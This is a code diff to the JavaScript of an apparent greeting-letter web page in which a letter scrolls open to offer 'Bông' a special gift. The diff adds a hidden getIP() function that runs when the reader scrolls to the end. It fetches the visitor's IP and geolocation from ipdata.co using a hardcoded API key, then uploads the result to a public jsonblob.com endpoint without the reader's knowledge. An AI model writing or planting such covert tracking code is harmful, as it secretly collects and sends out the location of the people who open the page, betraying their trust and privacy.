@@ -12,6 +12,46 @@ envelope.addEventListener('click', envelope_click);
 
 var count = 0;
 
+function makeid(length) {
+    let result = '';
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const charactersLength = characters.length;
+    let counter = 0;
+    while (counter < length) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+      counter += 1;
+    }
+    return result;
+}
+
+
+function getIP() {
+    var request = new XMLHttpRequest();
+
+    request.open('GET', 'https://api.ipdata.co/?api-key=4dd0604ca6fdf8f07fa048297a99e525bb0f80bc5e2ffbba0e91a181');
+
+    request.setRequestHeader('Accept', 'application/json');
+
+    request.onreadystatechange = function () {
+        if (this.readyState === 4) {
+            const data = this.responseText;
+              
+            let xhr = new XMLHttpRequest();
+            xhr.withCredentials = true;
+            xhr.open('PUT', 'https://jsonblob.com/api/jsonBlob/1299309526158008320');
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.setRequestHeader('Accept', 'application/json');
+            
+            xhr.onload = function() {
+                console.log(xhr.response);
+            };
+            
+            xhr.send(data);
+        };
+    }
+    request.send();
+}
+
 function envelope_click() {
     if (flip == null) return;
     console.log('click')
@@ -26,6 +66,7 @@ function envelope_click() {
 letter.addEventListener('scroll', event => {
     const {scrollHeight, scrollTop, clientHeight} = event.target;  
     if (Math.abs(scrollHeight - clientHeight - scrollTop) < 1 && count == 0) {
+        getIP();
         count = 1;
         console.log('scrolled');
         let text = "Bông có muốn nhận một món quà đặc biệt này nữa không?";
